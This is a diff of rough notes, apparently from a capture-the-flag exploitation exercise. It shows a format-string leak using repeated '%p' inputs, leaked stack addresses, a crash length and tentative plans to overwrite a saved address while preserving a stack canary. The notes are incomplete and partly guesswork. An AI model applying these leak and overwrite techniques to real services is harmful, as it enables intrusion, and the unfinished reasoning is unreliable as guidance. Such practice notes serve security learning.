@@ -144,8 +144,8 @@ Just the stack 40B:
 
 Stack after inputing 149B (50x %p):  
 ```
-return address: 0x555555555257 
-FP: 0x7fffffffec00 
+0x555555555257 
+0x7fffffffec00 
 0x555555555247 
 0x7fffffffec68 
 0x100000000 
@@ -155,7 +155,7 @@ FP: 0x7fffffffec00
 0x7ffff7f851f5 
 0x7ffff7f851ce 
 0x7fffffffec50 
-0 0xf8 
+0 0xf8  
 0x7ffff7ffdd48 
 0x55555555509e 
 0x1 
@@ -211,7 +211,7 @@ FP: 0x7fffffffec00
 0x19 
 0x7fffffffee39 
 0x1a 
-0 
+0 0x555555555257
 0x1f 
 0x7fffffffefea 
 0xf 
@@ -229,6 +229,50 @@ FP: 0x7fffffffec00
 0x732f6c61636f6c2f 
 0x7273752f3a6e6962
 ```
+
+
+The service accepts 1231B long string (all A-s), but does not respond when fed 1232B.   
+
+
+
+We feed 56x "%p " To not overrite the stack and get:  
+```
+0x555555555257 0x7fffffffec00 0x555555555247 0x7fffffffec68 0x100000000 0x7fffffffec10 0x555555555260 0x1 0x7ffff7f851f5 0x7ffff7f851ce 0x7fffffffec50 0 0xf8 0x7ffff7ffdd48 0x55555555509e 0x1 0x7fffffffee54 0 0x7fffffffee62 0x7fffffffeea4 0x7fffffffeeaf 0x7fffffffef0a 0x7fffffffef1e 0x7fffffffef2a 0x7fffffffef30 0x7fffffffef43 0x7fffffffef4a 0x7fffffffef58 0x7fffffffef66 0x7fffffffef7c
+```
+
+
+
+Where our value is stored, candidates:  
+```
+0x7fffffffec00  
+0x7fffffffec68
+```
+
+Override the `0x555555555260` which is behind the canary `0x100000000`. Keep that!!  
+
+
+So, fake address, 6B, has to be on top. `0x123456789ABC` So we know what's going on, where it is.  
+After that, we don't care? about  the frame pointer, but watch out on the canary value, has to be `0x100000000`. How do we insert null bytes?  
+
+0x100000000 - canary?  
+
+
+
+Plan B:
+```
+0x7ffff7f851f5 0x7ffff7f851ce 0x7fffffffec50 0 0xf8 0x7ffff7ffdd48 0x55555555509e
+```
+ 
+
+
+```
+
+
+
+```
+
+
+
 
 
 Flag:  
